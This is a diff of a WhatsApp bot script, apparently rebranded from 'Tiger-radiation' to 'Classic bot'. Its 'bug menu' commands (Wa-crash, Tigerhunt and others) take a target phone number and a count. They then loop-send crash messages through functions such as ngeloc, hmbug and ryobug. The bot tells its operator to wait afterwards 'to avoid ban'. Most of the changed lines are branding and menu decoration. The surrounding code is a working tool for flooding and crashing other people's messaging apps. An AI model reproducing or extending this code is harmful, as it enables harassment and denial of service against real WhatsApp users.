@@ -959,13 +959,13 @@ break
 		
 //=================================================//
 case 'tigerhunt': {
-if (!isCreator) return reply("Only Tiger-radiation-bugbot owner can use this command")
+if (!isCreator) return reply("Only TIGERBOT owner can use this command")
 if (!args[0]) return reply(`Use like .${command} 254392784527`)
 let tgt = args[0]
 let qt = tgt.replace(/[^0-9]/g, "")
 if (qt.startsWith('0')) return reply(`Number must be in international format like \n\nExample : .${command} 254392784527`)
 let target = qt + '@s.whatsapp.net'
-await reply("Processing 🐉")
+await reply("I HAVE NO MERCY💔⚠️")
 for (let j = 0; j < 40; j++) {
 await ngeloc(target, force)
 await ngeloc(target, force)
@@ -987,7 +987,7 @@ await ngeloc(target, force)
 await ngeloc(target, force)
 await ngeloc(target, force)
 }
-await reply(`Successfully Send Bug to ${target} Using ${command}. 🐉\n\n Wait some minutes to avoid ban.`)
+await reply(`Successfully Send Bug to ${target} Using ${command}. ✅\n\n Wait some minutes to avoid ban.`)
 }
 break
 //========================+=======
@@ -1014,25 +1014,25 @@ let messg = `
     ☬ 𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
     ☬ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
  
-✇✇✇✇✇✇✇✇✇✇✇✇✇✇✇✇✇
-     ✇𝐁𝐮𝐠𝐦𝐞𝐧𝐮
-     ✇𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
-     ✇𝐆𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮
-     ✇𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮
-     ✇𝐆𝐚𝐦𝐞𝐦𝐞𝐧𝐮
-     ✇𝐥𝐢𝐬𝐭𝐦𝐮𝐬𝐢𝐤
-     ✇𝐅𝐮𝐧𝐦𝐞𝐧𝐮
-     ✇𝐀𝐝𝐝𝐦𝐞𝐧𝐮
-     ✇𝐏𝐮𝐬𝐡𝐦𝐞𝐧𝐮
-     ✇𝐂𝐫𝐞𝐝𝐢𝐭𝐬
-     ✇𝐌𝐞𝐧𝐮𝐭𝐲𝐩𝐞
-✇✇✇✇✇✇✇✇✇✇✇✇✇✇✇✇✇     
+〓〓〓〓〓〓〓〓〓〓〓〓〓〓
+     ❖𝐁𝐮𝐠𝐦𝐞𝐧𝐮
+     ☬𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
+     ❖𝐆𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮
+     ☬𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮
+     ❖𝐆𝐚𝐦𝐞𝐦𝐞𝐧𝐮
+     ☬𝐥𝐢𝐬𝐭𝐦𝐮𝐬𝐢𝐤
+     ❖𝐅𝐮𝐧𝐦𝐞𝐧𝐮
+     ☬𝐀𝐝𝐝𝐦𝐞𝐧𝐮
+     ❖𝐏𝐮𝐬𝐡𝐦𝐞𝐧𝐮
+     ☬𝐂𝐫𝐞𝐝𝐢𝐭𝐬
+     ❖𝐌𝐞𝐧𝐮𝐭𝐲𝐩𝐞
+◨◧◨◧◨◧◨◧◨◧◨◧◨◧◨◧◨◧◨◧     
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
-✐𝐀𝐑𝐋𝐎𝐃𝐑𝐀𝐆𝐎𝐍 `
+©𝐀𝐑𝐋𝐎𝐃𝐑𝐀𝐆𝐎𝐍 `
 
 global.logo = "https://telegra.ph/file/16800f718dad3ed52d516.jpg"
 global.vidmenu = "https://telegra.ph/file/2e46ce86d3d531fbd3b9c.mp4"
-if(menutype === "v2") {
+if(menutype === "v1") {
         let buttonMessage = {
         image: { url: global.logo },
         caption: messg
@@ -1065,19 +1065,19 @@ case 'bugmenu': {
   ❤️‍🔥 𝐔𝐬𝐞𝐫 : ${pushname}}
   ⚠️ 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 
-┏▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-◊☬ 𝐄𝐯𝐢𝐥-𝐭𝐢𝐠𝐞𝐫 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃☬ 𝐑.𝐈.𝐏 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-◆☬ 𝐖𝐚-𝐜𝐫𝐚𝐬𝐡(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃☬ 𝐅𝐚𝐥𝐥𝐞𝐧-𝐫𝐚𝐝𝐢𝐚𝐭𝐢𝐨𝐧 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-◊☬ 𝐎𝐮𝐭-𝐨𝐟-𝐥𝐨𝐯𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃☬ 𝐁𝐢𝐠𝐝𝐢𝐜𝐤 (𝐝𝐢𝐫𝐞𝐜𝐭 𝐛𝐮𝐠 )
-◆☬ 𝐃𝐫𝐚𝐠𝐨𝐧𝐥𝐞𝐚𝐝
-┃☬ 𝐄𝐯𝐢𝐥𝐥𝐢𝐬𝐭
-◊✇ 𝐓𝐢𝐠𝐞𝐫𝐡𝐮𝐧𝐭 (254xxxxx)
-┗▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱
+🚨☬ 𝐄𝐯𝐢𝐥-𝐭𝐢𝐠𝐞𝐫 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐑.𝐈.𝐏 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐖𝐚-𝐜𝐫𝐚𝐬𝐡(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐅𝐚𝐥𝐥𝐞𝐧-𝐫𝐚𝐝𝐢𝐚𝐭𝐢𝐨𝐧 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐎𝐮𝐭-𝐨𝐟-𝐥𝐨𝐯𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐁𝐢𝐠𝐝𝐢𝐜𝐤 (𝐝𝐢𝐫𝐞𝐜𝐭 𝐛𝐮𝐠 )
+🚨☬ 𝐃𝐫𝐚𝐠𝐨𝐧𝐥𝐞𝐚𝐝
+🚨☬ 𝐄𝐯𝐢𝐥𝐥𝐢𝐬𝐭
+🚨☬ 𝐓𝐢𝐠𝐞𝐫𝐡𝐮𝐧𝐭 (254xxxxx)
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
-☬𝐀𝐑𝐋𝐎𝐃𝐑𝐀𝐆𝐎𝐍 
+©𝐀𝐑𝐋𝐎𝐃𝐑𝐀𝐆𝐎𝐍 
  
 `
 let hiks = {
@@ -1793,17 +1793,10 @@ text: `𝑯𝒆𝒍𝒍𝒐 ${pushname}
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬    
  🌎 𝐀𝐋𝐋 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 🥳
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬     
- ⦁ 𝐙𝐞𝐭𝐬𝐮𝐛𝐨𝐨𝐱𝐲𝐠 ⥈ 𝐈𝐧𝐝𝐨𝐧𝐞𝐬𝐢𝐚 🇮🇩
- ➢ 𝐖𝐫𝐢𝐭𝐢𝐧𝐠 𝐭𝐡𝐞 𝐛𝐚𝐬𝐞 𝐜𝐨𝐝𝐞 𝐮𝐬𝐢𝐧𝐠 𝐜𝐚𝐬𝐞 𝐦𝐞𝐭𝐡𝐨𝐝
+𝐓𝐈𝐆𝐄𝐑-𝐑𝐀𝐃𝐈𝐀𝐓𝐈𝐎𝐍-𝐁𝐔𝐆𝐒
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
- ⦁ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ⥈ 𝐊𝐞𝐧𝐲𝐚 🇰🇪
+ ⦁ 𝐀𝐑𝐋𝐎𝐃𝐑𝐀𝐆𝐎𝐍 ⥈ 𝐊𝐞𝐧𝐲𝐚 🇰🇪
  ➢ 𝐒𝐜𝐫𝐢𝐩𝐭 𝐦𝐚𝐧𝐭𝐚𝐢𝐧𝐚𝐧𝐜𝐞 𝐚𝐧𝐝 𝐦𝐚𝐝𝐞 𝐢𝐭 𝐚 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐛𝐨𝐭
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
- ⦁ 𝐋𝐨𝐫𝐝 𝐓𝐚𝐢𝐫𝐚 ⥈ 𝐍𝐢𝐠𝐞𝐫𝐢𝐚 🇳🇬
- ➢ Code Maintainer And Bug tester
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
- ⦁ 𝐄𝐦𝐩𝐨𝐫𝐨𝐫 𝐋𝐨𝐫𝐝
- ➢ 𝐅𝐨𝐫 𝐚𝐝𝐝𝐢𝐧𝐠 𝐠𝐢𝐭𝐡𝐮𝐛 𝐖𝐨𝐫𝐤𝐟𝐥𝐨𝐰 𝐟𝐨𝐫 𝐞𝐚𝐬𝐲 𝐝𝐞𝐩𝐥𝐨𝐲𝐦𝐞𝐧𝐭
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
  ⦁ 𝐓𝐡𝐚𝐧𝐤𝐬 𝐭𝐨 ${pushname} 
  ➢ 𝐅𝐨𝐫 𝐔𝐬𝐢𝐧𝐠 𝐭𝐡𝐞 𝐁𝐨𝐭 
@@ -2151,9 +2144,9 @@ if (!isCreator) return reply(mess.premium)
 if (!text) return reply(`Example: ${prefix + command} 25472823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
 jumlah = q.split(",")[1]
-hmbug(sendto, `TIGER-RADIATION 🤧💀 ...~${ios1}`)
+hmbug(sendto, `CLASSIC BOT 🤧💀 ...~${ios1}`)
 await sleep(5000)
-hmbug(sendto, `TIGER RADIATION 💀${ios1}`)
+hmbug(sendto, `CLASSIC BOT 💀${ios1}`)
 await sleep(5000)
 reply(mess.bugrespon + `\n❗Detail > \n😎 Target Number: ${sendto} \nBug Command: ${command}\n😋 Quantity: ${jumlah}`)
 }
@@ -2171,7 +2164,7 @@ hmbug(sendto, jumlah,  `I even Dont know 💀 `)
 await sleep(1000)
 await ryobug(sendto, jumlah,  `💔'҉Why You messed with❤️‍🩹`)
 await sleep(1000)
-await ryobug(sendto, jumlah,  `Radiontion tiger 🫂`)
+await ryobug(sendto, jumlah,  `Classic bot 🫂`)
 await sleep(1000)
 hmbug(sendto, jumlah,  `Go to hell 😕 `)
 await sleep(1000)
@@ -2218,7 +2211,7 @@ for (let i = 0; i < 10; i++) {
 let listMessage = {
     text: `💣Dragon hunter 💀`,
     footer: `🍻°⃟૰𝐤𝐢𝐥𝐥𝐞𝐫 -!ˢᵃᵐˢ🍺ꢵ`,
-    buttonText: `𝚃𝚒𝚐𝚎𝚛-𝚁𝚊𝚍𝚒𝚊𝚝𝚒𝚘𝚗`,
+    buttonText: `Classic - v3`,
     sections
 };
 
